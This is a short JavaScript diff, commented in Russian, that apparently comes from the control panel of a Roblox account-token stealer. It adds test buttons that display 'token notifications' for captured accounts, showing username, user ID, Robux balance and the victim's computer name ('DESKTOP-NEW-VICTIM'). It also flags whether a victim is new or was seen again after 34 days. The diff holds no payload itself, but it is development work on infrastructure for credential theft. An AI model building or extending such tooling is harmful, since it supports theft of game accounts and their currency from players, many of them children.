@@ -205,14 +205,27 @@ document.getElementById('btnSave')?.addEventListener('click', async function() {
 });
 
 // ── Тест уведомлений ─────────────────────────────────────────────────────────
-document.getElementById('btnTestNotification')?.addEventListener('click', () => {
+document.getElementById('btnTestNewNotification')?.addEventListener('click', () => {
   showTokenNotification({
-    username: 'RobloxMaster_777',
+    username: 'RobloxLegend_2026',
     userId: '1842039',
-    robux: 15400,
-    computer: 'DESKTOP-USER'
+    robux: 24500,
+    computer: 'DESKTOP-NEW-VICTIM',
+    lastLogin: null // Новый аккаунт
   });
-  toast('Тестовое уведомление отправлено');
+  toast('Тестовое уведомление: Новый аккаунт');
+});
+
+document.getElementById('btnTestOldNotification')?.addEventListener('click', () => {
+  const thirtyFourDaysAgo = Date.now() - (34 * 24 * 60 * 60 * 1000) - (2 * 60 * 60 * 1000);
+  showTokenNotification({
+    username: 'TraderPro_Robux',
+    userId: '492015',
+    robux: 8900,
+    computer: 'DESKTOP-OLD-PC',
+    lastLogin: thirtyFourDaysAgo // Был вход ~1 месяц назад
+  });
+  toast('Тестовое уведомление: Повторный аккаунт (34 дн.)');
 });
 
 document.getElementById('btnBrowserPermission')?.addEventListener('click', async () => {
